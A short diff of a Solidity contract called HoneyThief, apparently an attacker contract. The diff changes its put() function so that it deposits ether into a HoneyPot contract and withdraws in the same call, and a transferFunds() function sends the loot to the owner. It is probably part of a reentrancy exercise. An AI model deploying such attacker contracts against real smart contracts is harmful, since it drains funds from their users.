@@ -22,12 +22,9 @@ contract HoneyThief is Ownable {
 
     function put(HoneyPot honeyPotAddress) public payable onlyOwner {
         HoneyPot(honeyPotAddress).put.value(msg.value)();
-    }
-
-    function get(HoneyPot honeyPotAddress) public onlyOwner {
         HoneyPot(honeyPotAddress).get();
     }
-
+    
     function transferFunds() public onlyOwner {
         (bool success, ) = msg.sender.call.value(address(this).balance)("");
         require(success, "Transfer failed.");
